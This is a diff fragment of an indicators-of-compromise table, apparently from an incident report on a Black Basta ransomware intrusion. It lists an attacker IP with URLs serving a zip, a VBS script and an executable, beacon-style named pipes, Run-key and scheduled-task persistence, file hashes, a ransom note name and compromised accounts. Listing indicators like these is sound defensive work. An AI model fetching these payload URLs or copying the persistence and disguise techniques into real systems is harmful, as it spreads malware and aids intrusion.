-| `6as98v.exe` (Black Basta) | MD5 `998022B70D83C6DE68E5BDF94E0F8D71`, SHA1 `B87A947F3E85701FCDADD733E9B055A65A3B1308`, SHA256 `7883F01096DB9BCF090C2317749B6873036C27BA92451B212B8645770E1F0B8A` |
-| Ransom note | `readme.txt` |
-| Tài khoản | `knixon`, `swhite` |
+| IP | 54.93.105.22, 10.10.6.159 |
+| URL | http://54.93.105.22/Financial%20Records.zip, http://54.93.105.22/F6w1S48.vbs, http://54.93.105.22/6as98v.exe |
+| Pipe | MSSE-8859-server, MSSE-5028-server, postex_2198 |
+| Registry | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater, scheduled task WiindowsUpdate |
+| Financial Records.xlsm | MD5 1157A1B4C47091B7020143D00B5D2860, SHA256 030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15 |
+| WindowsUpdaterFX.dll | MD5 735AB5713DB79516CF350265FA7574E5, SHA256 9A02357D3091379C4A9568F6427C45554E48DAA910CF2F7BD871A9CF7F7B2CB4 |
+| Pancake.jpg.exe | SHA1 3AB69BA2901828CB4FE892976F4808DB0E4EF2A1, MD5 5C215C4E29C8EC7FE1590517319C6ECA, SHA256 0BEF3A121BC1CADD69B27784616D1E112ADE2A82F961272EDDF7F7641A80CE15 |
+| PsExec64.exe | SHA256 AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4 |
+| 6as98v.exe (Black Basta) | MD5 998022B70D83C6DE68E5BDF94E0F8D71, SHA1 B87A947F3E85701FCDADD733E9B055A65A3B1308, SHA256 7883F01096DB9BCF090C2317749B6873036C27BA92451B212B8645770E1F0B8A |
+| Ransom note | readme.txt |
+| Tài khoản | knixon, swhite |
 
 
 
